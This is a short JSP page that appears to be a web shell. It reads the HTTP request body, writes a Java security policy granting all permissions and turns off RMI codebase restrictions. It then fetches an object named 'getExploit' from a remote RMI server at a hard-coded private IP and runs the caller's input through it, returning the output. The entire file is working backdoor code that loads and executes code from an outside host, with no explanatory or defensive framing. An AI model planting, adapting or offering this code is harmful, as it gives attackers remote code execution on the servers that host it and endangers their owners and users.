<%@ page import="java.rmi.RMISecurityManager" %>
<%@ page import="java.rmi.Naming" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileWriter" %>
<%@ page import="java.io.BufferedWriter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
	br.close();

    if(wholeStr != null && !wholeStr.trim().equals("")) {
		wholeStr = wholeStr.substring(0,wholeStr.length()-1);
        try {
            File file = new File("security.policy");
            if(!file.exists()){
                file.createNewFile();
                FileWriter fileWritter = new FileWriter(file.getName(),true);
                BufferedWriter bufferWritter = new BufferedWriter(fileWritter);
                bufferWritter.write("grant {\n" +
                        "    permission java.security.AllPermission;\n" +
                        "};");
                bufferWritter.close();
            }
            System.setProperty("java.security.policy","security.policy");
            System.setProperty("java.rmi.server.useCodebaseOnly","false");
            System.setSecurityManager(new RMISecurityManager());

            Object object = Naming.lookup("rmi://192.168.177.129:1099/Object");
            Method method = object.getClass().getMethod("getExploit", null);
            Object obj = method.invoke(object);
            method = obj.getClass().getMethod("run", String.class);
            response.getWriter().print(method.invoke(obj, wholeStr));
        } catch (Exception e){
            e.printStackTrace();
        }
    }
%>
